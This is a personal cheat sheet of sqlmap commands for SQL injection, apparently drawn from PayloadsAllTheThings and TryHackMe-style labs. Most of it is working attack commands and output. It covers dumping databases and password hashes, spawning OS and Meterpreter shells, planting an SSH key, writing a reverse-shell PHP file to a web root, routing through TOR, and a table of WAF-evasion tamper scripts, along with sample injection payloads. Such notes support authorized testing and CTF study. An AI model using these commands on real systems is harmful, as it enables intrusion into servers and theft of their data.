---
title: Sqlmap 🪲
tags:
  - Tool
---
## PayloadsAllTheThings Commands
### Basic arguments for SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

### Load a request file and use mobile user-agent

```powershell
sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
```

### Custom injection in UserAgent/Header/Referer/Cookie

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
The injection is located at the '*'
```

### Second order injection

```powershell
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

### Shell

- SQL Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --sql-shell`
- OS Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell`
- Meterpreter: `python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn`
- SSH Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`

### Crawl a website with SQLmap and auto-exploit

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```

### Using TOR with SQLmap

```powershell
sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```

### Using a proxy with SQLmap

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
```

### Using Chrome cookie and a Proxy

```powershell
sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
```

### Using suffix to tamper the injection

```powershell
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

### General tamper option and tamper's list

```powershell
tamper=name_of_the_tamper
```

|Tamper|Description|
|---|---|
|0x2char.py|Replaces each (MySQL) 0x encoded string with equivalent CONCAT(CHAR(),…) counterpart|
|apostrophemask.py|Replaces apostrophe character with its UTF-8 full width counterpart|
|apostrophenullencode.py|Replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py|Appends encoded NULL byte character at the end of payload|
|base64encode.py|Base64 all characters in a given payload|
|between.py|Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'|
|bluecoat.py|Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator|
|chardoubleencode.py|Double url-encodes all characters in a given payload (not processing already encoded)|
|charencode.py|URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)|
|charunicodeencode.py|Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)|
|charunicodeescape.py|Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)|
|commalesslimit.py|Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
|commalessmid.py|Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
|commentbeforeparentheses.py|Prepends (inline) comment before parentheses (e.g. ( -> /**/()|
|concat2concatws.py|Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py|Url-encodes all characters in a given payload (not processing already encoded)|
|charunicodeencode.py|Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)|
|equaltolike.py|Replaces all occurrences of operator equal ('=') with operator 'LIKE'|
|escapequotes.py|Slash escape quotes (' and ")|
|greatest.py|Replaces greater than operator ('>') with 'GREATEST' counterpart|
|halfversionedmorekeywords.py|Adds versioned MySQL comment before each keyword|
|htmlencode.py|HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> ')|
|ifnull2casewhenisnull.py|Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart|
|ifnull2ifisnull.py|Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
|informationschemacomment.py|Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier|
|least.py|Replaces greater than operator (‘>’) with ‘LEAST’ counterpart|
|lowercase.py|Replaces each keyword character with lower case value (e.g. SELECT -> select)|
|modsecurityversioned.py|Embraces complete query with versioned comment|
|modsecurityzeroversioned.py|Embraces complete query with zero-versioned comment|
|multiplespaces.py|Adds multiple spaces around SQL keywords|
|nonrecursivereplacement.py|Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
|overlongutf8.py|Converts all characters in a given payload (not processing already encoded)|
|overlongutf8more.py|Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)|
|percentage.py|Adds a percentage sign ('%') infront of each character|
|plus2concat.py|Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart|
|plus2fnconcat.py|Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart|
|randomcase.py|Replaces each keyword character with random case value|
|randomcomments.py|Add random comments to SQL keywords|
|securesphere.py|Appends special crafted string|
|sp_password.py|Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs|
|space2comment.py|Replaces space character (' ') with comments|
|space2dash.py|Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')|
|space2hash.py|Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')|
|space2morehash.py|Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')|
|space2mssqlblank.py|Replaces space character (' ') with a random blank character from a valid set of alternate characters|
|space2mssqlhash.py|Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')|
|space2mysqlblank.py|Replaces space character (' ') with a random blank character from a valid set of alternate characters|
|space2mysqldash.py|Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')|
|space2plus.py|Replaces space character (' ') with plus ('+')|
|space2randomblank.py|Replaces space character (' ') with a random blank character from a valid set of alternate characters|
|symboliclogical.py|Replaces AND and OR logical operators with their symbolic counterparts (&& and|
|unionalltounion.py|Replaces UNION ALL SELECT with UNION SELECT|
|unmagicquotes.py|Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)|
|uppercase.py|Replaces each keyword character with upper case value 'INSERT'|
|varnish.py|Append a HTTP header 'X-originating-IP'|
|versionedkeywords.py|Encloses each non-function keyword with versioned MySQL comment|
|versionedmorekeywords.py|Encloses each keyword with versioned MySQL comment|
|xforwardedfor.py|Append a fake HTTP header 'X-Forwarded-For'|

### SQLmap without SQL injection

You can use SQLmap to access a database via its port instead of a URL.

```powershell
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
```

---

```shell
sqlmap http://10.10.134.119/admin?user=3 --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDc1NzM3Mzh9.EQ-QxUbiFb5WYxEP6e8izPs_r4iGouEevWSjuhE1ZaM' --technique=U --delay=2 --dump
```

- Command with a request with no query params on url:
	- First, copy the request captured with Burp to a file
	- Then:

```shell
sqlmap -r request.txt

# Then do
sqlmap -r request.txt --dbs

# Attack the database you want

sqlmap -r request.txt -D <TABLE_NAME> --tables --dump

# a more complete command
sqlmap -r request.txt -p 'email' --dbms=mysql --level=3 --risk=3 --batch --technique=BUT --dbs --dump --threads 3
```

---

## Get a reverse shell with slqmap:

```shell
sqlmap -r request.txt --dbs --file-dest=/var/www/html/reverse.php --file-write=./reverse.php
```

- Now open open your browser: `http://IP_HOST/reverse.php`

---
## Display databases when performing a successful attack

If you got a successful payload, then do this:
- Extract databases by adding `--dbs` to the original attack:
	- Just say `y` and will load the previous results.

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL --dbs

# Output may be like:
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[22:27:40] [INFO] fetching database names
[22:27:40] [INFO] fetching number of databases
[22:27:40] [INFO] retrieved: 2
[22:27:42] [INFO] retrieved: informati
on_schema
[22:28:47] [INFO] retrieved: sqhell_1
available databases [2]:
[*] information_schema
[*] sqhell_1
```

- Now that you know the databases, get the tables of the one you are interested:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL -D DATBASE_NAME --tables

# Output may be like:
[22:31:23] [INFO] retrieved: 
[22:31:28] [INFO] adjusting time delay to 1 second due to good response times
flag
[22:31:41] [INFO] retrieved: hits
Database: sqhell_1
[2 tables]
+------+
| flag |
| hits |
+------+
```

- Now list columns of a database table:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL -D DATBASE_NAME -T TABLE --columns

# Output may be like:
[22:33:58] [INFO] retrieved: 
[22:34:03] [INFO] adjusting time delay to 1 second due to good response times
id
[22:34:09] [INFO] retrieved: int
[22:34:21] [INFO] retrieved: flag
[22:34:35] [INFO] retrieved: varchar(250)
Database: sqhell_1
Table: flag
[2 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(250) |
| id     | int          |
+--------+--------------+
```

- Now dump it the table's column:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL -D DATBASE_NAME -T TABLE -C COLUMN --dump

# Output may be like:

[22:36:07] [INFO] adjusting time delay to 1 second due to good response times
THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
Database: sqhell_1
Table: flag
[1 entry]
+---------------------------------------------+
| flag                                        |
+---------------------------------------------+
| XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX |
+---------------------------------------------+
```

## Register forms

```shell
sqlmap -u 'http://domain.com/register/user-check?username=gitblanc' -p username --risk 3 --level 5 --dbms MySQL

# Output may be like:
[22:53:35] [INFO] checking if the injection point on GET parameter 'username' is a false positive
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 468 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-3381' OR 3435=3435-- ihVx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=gitblanc' AND (SELECT 8410 FROM (SELECT(SLEEP(5)))sPpn)-- xphf
---
```

- Then you can try to obtain databases by adding at the end `--dbs`
- Then obtain tables by adding `-D DATBASE_NAME --tables` replacing `--dbs`
- Then obtain columns by adding `-T TABLE --columns` replacing `--tables`
- Then dump a columns by adding `-C COLUMN --dump` replacing `--columns`

## URL parameters

- If you find something like: `http://10.10.115.157/user?id=1`
- Try this:

```shell
sqlmap -u 'http://10.10.115.157/user?id=1' -p id --risk 3 --level 5 --dbms MySQL

# Output may be like:
[23:02:27] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3835=3835

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5327 FROM (SELECT(SLEEP(5)))tHWS)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-4293 UNION ALL SELECT CONCAT(0x7162787171,0x5648626b46674875456f46496a4c746c5a4e4462736575774246467a477a70414d655351486f546e,0x717a707671),NULL,NULL-- -
---

```